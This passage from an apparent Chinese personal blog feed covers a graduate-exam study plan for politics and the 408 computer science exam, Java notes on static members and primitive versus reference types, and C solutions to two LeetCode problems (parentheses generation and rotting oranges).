id="月12日10月11日">8月12日~10月11日</h4><p>主要任务：（不多于1.5小时）</p><ul><li>观看徐涛政治强化课（过一遍知识点）</li><li>刷1000题</li></ul><p>建议：</p><ul><li>九月初开始政治都行，视频看不完的话就只看马原和毛概的视频</li><li>建议<strong>看完一节课就刷对应章节的1000题</strong></li></ul><h4 id="月12日11月12日">10月12日~11月12日</h4><p>主要任务：（不多于2小时）</p><ul><li>腿姐技巧课（我觉得技巧课还是挺有用的）</li><li>每天抽出半小时看背诵手册（不用硬背，过一过知识点）</li><li>二刷1000题</li></ul><p>建议：</p><ul><li>没时间也可以不看技巧课，多刷刷选择题</li><li>每天翻一翻背诵手册，最好不要隔几天学一会</li></ul><h4 id="月13日12月9日">11月13日~12月9日</h4><p>主要任务：（不多于2.5小时）</p><ul><li><strong>一刷</strong>+<strong>二刷</strong>肖八选择题，把每个知识点搞熟（只刷选择题）</li><li>每天翻一翻背诵手册</li></ul><p>建议：</p><ul><li>肖八选择题很重要，可以在规定时间内进行模拟</li><li>尽量把每个知识点弄熟</li></ul><h4 id="月10日考前">12月10日~考前</h4><p>主要任务：（三小时左右）</p><ul><li><strong>一刷</strong>+<strong>二刷</strong> 肖四选择题</li><li>每天抽1~1.5小时背诵肖四大题</li></ul><p>建议：</p><ul><li>背诵大题可以参考网上的带背视频或资料</li><li>尽量多背诵几套，实在背不完也<strong>必须把前两套背完</strong></li></ul><h4 id="考试当日-2">考试当日</h4><p>第一门考试，还是挺激动的，其实大题我是没背完的，第四套基本没背，第三套背的不熟。选择题比较顺利，甚至有肖四肖八原题。然后开始大题，我先浏览一遍所有大题，心想这把稳了，全是前两套背过的类似的题目，可以直接套用。然后就是拼手速的阶段，写得越多越好，就算题目可能是你没见过的，但是你已经背过一些语句，很自然而然的就应用上去了。</p><h3 id="分">408（111分）</h3><p>最难的一部分，知识点很多，建议尽早开始</p><blockquote><p>推荐老师：B站-王道计算机教育、B站-湖科大教书匠（计网）</p><p>推荐教材：王道四件套-数据结构、计算机组成原理、操作系统、计算机网络</p></blockquote><h4 id="月1日5月5日">3月1日~5月5日</h4><p><strong>这部分建议大家不要学我，数据结构进度太慢了</strong></p><p>主要任务：</p><ul><li>王道数据结构课程</li><li>王道数据结构教材上的<strong>选择题</strong>（前期只做选择题）</li></ul><p>建议：</p><ul><li>建议数据结构不要像我一样拖拉，尽量四月中旬之前结束</li></ul><h4 id="月6日6月2日">5月6日~6月2日</h4><p>主要任务：（3~3.5小时）</p><ul><li>王道计算机组成原理课程</li><li>王道计算机组成原理教材<strong>选择题</strong></li></ul><p>建议：</p><ul><li>计组算是最难的一门课了，第一遍要认真学，每题弄懂，时间不要多于40天</li><li>太难的可以第二遍再学（例如第二章浮点数的乘除法）</li></ul><h4 id="月3日7月1日">6月3日~7月1日</h4><p>主要任务：（3~3.5小时）</p><ul><li>王道操作系统课程</li><li>王道操作系统教材<strong>选择题</strong></li></ul><p>建议：</p><ul><li>操作系统比较抽象，第一遍尽量都弄懂，太难的第二遍再学</li></ul><h4 id="月2日7月23日">7月2日~7月23日</h4><p>主要任务：（3~3.5小时）</p><ul><li>王道计算机网络课程 + 湖科大教书匠计网课程（配合学习）</li><li>王道计算机网络教材<strong>选择题</strong></li></ul><p>建议：</p><ul><li>计网的概念比较多，学起来快一点</li><li>课程方面，如果王道的计网课程有不清楚的地方可以配合着看湖科大教书匠的课程</li></ul><h4 id="月28日8月31日">7月28日~8月31日</h4><p>主要任务：（3~3.5小时）</p><ul><li>观看数据结构强化课程</li><li>二刷数据结构知识点和选择题（有遗忘很正常）</li><li>大题只做<strong>真题</strong></li><li>有时间就做一做思维导图（没时间就用网上现成的也行）</li></ul><p>建议：</p><ul><li>如果知识点忘得多，就先过一遍知识点再看强化视频</li><li>大题真题建议留最近的两年最后进行模拟</li><li>这里可以提速，我复习的速度还是慢了一点</li><li>如果大题没做完可以在下一阶段复习计组的时候每天写一两道</li></ul><h4 id="月1日9月26日">9月1日~9月26日</h4><p>主要任务：（3~4小时）</p><ul><li>观看计组强化课程</li><li>二刷计组知识点和选择题</li><li>大题只做真题</li><li>思维导图</li></ul><p>建议：</p><ul><li>如果知识点忘得多，就先过一遍知识点再看强化视频</li><li>大题做不完可以在复习操作系统的时候每天抽时间写一两道</li><li>在复习计组时，可以隔一两天就写一两道数据结构算法题</li></ul><h4 id="月27日10月31日">9月27日~10月31日</h4><p>主要任务：（3~4小时）</p><ul><li>观看操作系统强化课程、计网强化课程（计网不看也行）</li><li>二刷操作系统、计网知识点和选择题（可以交叉进行）</li><li>大题只做真题</li><li>思维导图</li></ul><p>建议：</p><ul><li>操作系统和计网这两门比较简单，可以同时进行（按自己节奏来）</li><li>大题做不完在下一阶段继续做（灵活调整）</li></ul><h4 id="月1日11月5日">11月1日~11月5日</h4><p>主要任务：（3~4小时）</p><ul><li>把之前没做完的大题全做完（收尾）</li><li>再过一遍大题的错题</li></ul><p>建议：</p><ul><li>这个阶段大题至少完成了一刷（这里说的大题只限于真题）</li><li>前面在复习不同课程时，有时间就看看408其他科目大题错题</li></ul><h4 id="月6日11月28日">11月6日~11月28日</h4><p>主要任务：（3~3.5小时）</p><ul><li>开始408真题（09~22年，23年留作模拟）</li><li>三天两张试卷或者四天三张试卷</li></ul><p>建议：</p><ul><li>真题按照考研规定时间写</li><li>认真订正，将每次错题相关的知识点记录下来</li></ul><h4 id="月29日考前">11月29日~考前</h4><p>主要任务：（3~3.5小时）</p><ul><li>三刷408知识点+选择题</li><li>二刷真题卷</li><li>考前几天用23年真题卷模拟</li></ul><p>建议：</p><ul><li>三刷选择题可以只刷错题</li><li>二刷真题卷有错误很正常，把相关知识点记熟就行了</li></ul><h4 id="考试当日-3">考试当日</h4><p>408作为最后一门果然是不负众望，选择题难度不小，很多小知识点，平时稍微不注意就会忽略，我也确实蒙了几题<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，不过大题中规中矩，计算的题目不少。最后的分数也是没有达到预期，估计大题小错误不少。​</p>]]></content>
    
    
    <categories>
      
      <category>考研</category>
      
    </categories>
    
    
    <tags>
      
      <tag>考研</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java中的静态与非静态</title>
    <link href="/2024/04/05/Java%E4%B8%AD%E7%9A%84%E9%9D%99%E6%80%81%E4%B8%8E%E9%9D%9E%E9%9D%99%E6%80%81/"/>
    <url>/2024/04/05/Java%E4%B8%AD%E7%9A%84%E9%9D%99%E6%80%81%E4%B8%8E%E9%9D%9E%E9%9D%99%E6%80%81/</url>
    
    <content type="html"><![CDATA[<ul><li><p>Java中的<code>Object</code>（对象）是类的实例</p></li><li><p>静态成员和方法由<code>static</code>修饰，属于类，可以通过类名直接访问，无需创建类的实例。</p></li><li><p>非静态成员和方法属于类的实例，不需要<code>static</code>修饰，非静态成员和方法必须通过类的实例（对象）访问（通过new关键字创建对象后，再通过对象调用）。</p></li><li><p>示例：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> {</span><br><span class="line">    <span class="comment">// 静态成员变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">staticVariable</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 非静态成员变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">nonStaticVariable</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticMethod</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"This is a static method."</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">nonStaticMethod</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"This is a non-static method."</span>);</span><br><span class="line">        nonStaticVariable+=<span class="number">1</span>;</span><br><span class="line">        System.out.println(nonStaticVariable);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="comment">// 访问静态成员和方法</span></span><br><span class="line">        Example.staticVariable = <span class="number">1</span>;</span><br><span class="line">        Example.staticMethod();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建类的实例并访问非静态成员和方法</span></span><br><span class="line">        <span class="type">Example</span> <span class="variable">example</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line">        example.nonStaticVariable = <span class="number">1</span>;</span><br><span class="line">        example.nonStaticMethod();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>在上面的示例代码中，我们定义了一个名为 <code>Example</code>的类，并在其中定义了一个静态成员变量<code>staticVariable</code>，一个非静态成员变量<code>nonStaticVariable</code>，一个静态方法 <code>staticMethod</code>和一个非静态方法<code>nonStaticMethod</code>。我们展示了如何访问静态和非静态成员和方法。</p></li></ul><blockquote><p>在非静态方法 <code>nonStaticMethod()</code> 中，可以直接访问<code>nonStaticVariable</code>变量，而不需要通过对象来调用，是因为非静态方法是属于类的实例（对象）的，它们可以直接访问类的成员变量和方法，包括非静态变量和非静态方法。在方法内部，即使没有使用<code>this</code> 关键字来引用当前对象，也可以直接访问非静态变量<code>nonStaticVariable</code>。这是因为在方法内部，Java会隐式地引用当前对象，使得您可以直接访问对象的成员变量。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CS61B</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>primitive type和reference type</title>
    <link href="/2024/04/05/primitive-type%E5%92%8Creference-type/"/>
    <url>/2024/04/05/primitive-type%E5%92%8Creference-type/</url>
    
    <content type="html"><![CDATA[<p>数据类型可以分为两类：基本数据类型（primitivetype）和引用数据类型（reference type）。</p><p><strong>基本数据类型</strong>是指整数、浮点数、布尔值等（<code>byte</code>、<code>short</code>、<code>int</code>、<code>long</code>、<code>float</code>、 <code>double</code>、<code>boolean</code>、<code>char</code>）。这些类型的值是直接存储在内存中的，它们的大小是固定的，因此它们的操作速度非常快。</p><p><strong>引用数据类型</strong>是指<strong>对象</strong>、<strong>数组</strong>、<strong>函数</strong>等类型。这些类型的值是存储在内存中的地址，而不是直接存储在变量中。因此，当我们操作引用类型时，实际上是在操作存储在内存中的地址，而不是实际的值。这使得引用数据类型的操作速度相对较慢。</p><p>一个重要的区别是，基本数据类型的值在传递给函数或赋值给另一个变量时，会被复制一份。而引用数据类型的值在传递给函数或赋值给另一个变量时，只会复制它的地址，而不是它的值。这意味着，如果我们修改了一个引用数据类型的值，它会影响到所有引用该值的变量。</p><h2 id="基本数据类型">基本数据类型</h2><p>例如，在Java中，int是一种基本数据类型，下面是一个示例代码：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> a; <span class="comment">// b的值是10，而不是a的地址</span></span><br><span class="line">b = <span class="number">20</span>; <span class="comment">// a的值仍然是10</span></span><br></pre></td></tr></tbody></table></figure><h2 id="引用数据类型">引用数据类型</h2><p><strong>对象</strong>通常是引用数据类型，例如下面这个例子：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PollQuestions</span> {</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">      <span class="type">Walrus</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Walrus</span>(<span class="number">1000</span>, <span class="number">8.3</span>);</span><br><span class="line">      Walrus b;</span><br><span class="line">      b = a;</span><br><span class="line">      b.weight = <span class="number">5</span>;   <span class="comment">//修改b.weight的值，同时a.weight的值也被改变了</span></span><br><span class="line">      System.out.println(a);</span><br><span class="line">      System.out.println(b);       </span><br><span class="line">   }</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Walrus</span> {</span><br><span class="line">      <span class="keyword">public</span> <span class="type">int</span> weight;</span><br><span class="line">      <span class="keyword">public</span> <span class="type">double</span> tuskSize;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">public</span> <span class="title function_">Walrus</span><span class="params">(<span class="type">int</span> w, <span class="type">double</span> ts)</span> {</span><br><span class="line">         weight = w;</span><br><span class="line">         tuskSize = ts;</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> {</span><br><span class="line">         <span class="keyword">return</span> String.format(<span class="string">"weight: %d, tusk size: %.2f"</span>, weight, tuskSize);</span><br><span class="line">      }</span><br><span class="line">   }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出结果为：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weight: 5, tusk size: 8.30</span><br><span class="line">weight: 5, tusk size: 8.30</span><br></pre></td></tr></tbody></table></figure><p>总之，这两种数据类型在编程中都非常常见，理解它们之间的区别非常重要。</p>]]></content>
    
    
    <categories>
      
      <category>CS61B</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>括号生成</title>
    <link href="/2024/03/20/%E6%8B%AC%E5%8F%B7%E7%94%9F%E6%88%90/"/>
    <url>/2024/03/20/%E6%8B%AC%E5%8F%B7%E7%94%9F%E6%88%90/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/generate-parentheses/</p><p>hot100里的关于回溯的题，直接套用代码随想录的模板：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">backtracking</span><span class="params">(参数)</span> {</span><br><span class="line">    <span class="keyword">if</span> (终止条件) {</span><br><span class="line">        存放结果;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (选择：本层集合中元素（树中节点孩子的数量就是集合的大小）) {</span><br><span class="line">        处理节点;</span><br><span class="line">        backtracking(路径，选择列表); <span class="comment">// 递归</span></span><br><span class="line">        回溯，撤销处理结果</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>但是括号是配对的，不能通过<code>for</code>循环进行遍历，需要通过判断左括号的数量从而确定是否选取右括号。通过<strong>单步条件判断</strong><code>if</code>是否将当前括号加入路径。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> resTop;</span><br><span class="line"><span class="type">int</span> pathTop;</span><br><span class="line"><span class="type">int</span> left, right;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span>** res, <span class="type">char</span>* path)</span> {</span><br><span class="line">    <span class="keyword">if</span>(pathTop == n*<span class="number">2</span>) {</span><br><span class="line">        <span class="type">char</span>* tmp = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*(pathTop+<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;pathTop; i++)</span><br><span class="line">            tmp[i] = path[i];</span><br><span class="line">        tmp[pathTop]=<span class="string">'\0'</span>;</span><br><span class="line">        res[resTop++] = tmp;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(left&lt;n) { <span class="comment">// 左括号还有剩余</span></span><br><span class="line">        path[pathTop++] = <span class="string">'('</span>;</span><br><span class="line">        left++;</span><br><span class="line">        backtracking(n, res, path);</span><br><span class="line">        left--;</span><br><span class="line">        pathTop--;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(right&lt;left) {   <span class="comment">// 还有未匹配的左括号（right==left时，说明配对完毕）</span></span><br><span class="line">        path[pathTop++] = <span class="string">')'</span>;</span><br><span class="line">        right++;</span><br><span class="line">        backtracking(n, res, path);</span><br><span class="line">        right--;</span><br><span class="line">        pathTop--;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="type">char</span>** <span class="title function_">generateParenthesis</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>* returnSize)</span> {</span><br><span class="line">    <span class="type">char</span>** res = (<span class="type">char</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>*)*<span class="number">10000</span>);</span><br><span class="line">    <span class="type">char</span>* path = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">20</span>);</span><br><span class="line">    resTop = pathTop = <span class="number">0</span>;</span><br><span class="line">    left = <span class="number">1</span>; <span class="comment">// 左括号数</span></span><br><span class="line">    right = <span class="number">0</span>; <span class="comment">// 右括号数</span></span><br><span class="line">    path[pathTop++] = <span class="string">'('</span>;</span><br><span class="line">    backtracking(n, res, path);</span><br><span class="line">    *returnSize = resTop;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>腐烂的橘子</title>
    <link href="/2024/03/19/%E8%85%90%E7%83%82%E7%9A%84%E6%A9%98%E5%AD%90/"/>
    <url>/2024/03/19/%E8%85%90%E7%83%82%E7%9A%84%E6%A9%98%E5%AD%90/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/rotting-oranges/</p><p>这题应该使用广度优先搜索。</p><ul><li>先将原本就腐烂的橘子加入队列中，同时标记为true</li><li>当所有腐烂橘子加入队列中后，再调用<code>bfs</code></li><li><code>bfs</code>中，当队列不为空则一直出队，直到队空</li><li>使用两层循环，第一层循环遍历当前队列中的橘子（当前层橘子需要全部出队），第二层遍历四个方向上相邻的橘子</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = {<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>};</span><br><span class="line"><span class="type">int</span> edge_x, edge_y;</span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line"><span class="type">int</span> front, rear; <span class="comment">// 队头，队尾</span></span><br><span class="line"><span class="type">int</span> flag;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bfs</span><span class="params">(<span class="type">int</span>** grid, <span class="type">int</span>** que, <span class="type">bool</span>** visited)</span> {</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(front&lt;rear) {</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> start = front;</span><br><span class="line">        <span class="type">int</span> end = rear; <span class="comment">// 记录当前队列中的橘子</span></span><br><span class="line">        flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=start; j&lt;end; j++) { <span class="comment">// 上一步记录的橘子全部出队</span></span><br><span class="line">            <span class="type">int</span> nx = que[front][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> ny = que[front++][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++) {</span><br><span class="line">                <span class="type">int</span> next_x = nx + dir[i][<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> next_y = ny + dir[i][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(next_x&lt;<span class="number">0</span> || next_x&gt;=edge_x || next_y&lt;<span class="number">0</span> || next_y&gt;=edge_y) </span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(grid[next_x][next_y]==<span class="number">1</span>) {</span><br><span class="line">                    flag=<span class="number">1</span>;</span><br><span class="line">                    grid[next_x][next_y] = <span class="number">2</span>;</span><br><span class="line">                    visited[next_x][next_y] = <span class="literal">true</span>;</span><br><span class="line">                    que[rear][<span class="number">0</span>] = next_x;</span><br><span class="line">                    que[rear++][<span class="number">1</span>] = next_y;</span><br><span class="line">                    </span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">            count++;</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">orangesRotting</span><span class="params">(<span class="type">int</span>** grid, <span class="type">int</span> gridSize, <span class="type">int</span>* gridColSize)</span> {</span><br><span class="line">    edge_x = gridSize;</span><br><span class="line">    edge_y = *gridColSize;</span><br><span class="line">    <span class="type">int</span>** que = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*)*(gridSize*(*gridColSize)));</span><br><span class="line">    front = rear = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(gridSize*(*gridColSize)); i++) {</span><br><span class="line">        que[i] = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">2</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="type">bool</span>** visited = (<span class="type">bool</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">bool</span>*)*gridSize);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;gridSize; i++) {</span><br><span class="line">        visited[i] = (<span class="type">bool</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">bool</span>)*(*gridColSize));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;(*gridColSize); j++) {</span><br><span class="line">            visited[i][j] = <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;gridSize; i++) {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;*gridColSize; j++) {</span><br><span class="line">            <span class="keyword">if</span>(!visited[i][j] &amp;&amp; grid[i][j]==<span class="number">2</span>) {</span><br><span class="line"></span><br><span class="line">                visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">                que[rear][<span class="number">0</span>] = i;</span><br><span class="line">                que[rear++][<span class="number">1</span>] = j;</span><br><span class="line">                </span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    bfs(grid, que, visited);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;gridSize; i++) {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;*gridColSize; j++) {</span><br><span class="line">            <span class="keyword">if</span>(grid[i][j]==<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>岛屿数量</title>
    <link href="/2024/03/18/%E5%B2%9B%E5%B1%BF%E6%95%B0%E9%87%8F/"/>
    <url>/2024/03/18/%E5%B2%9B%E5%B1%BF%E6%95%B0%E9%87%8F/</url>
    
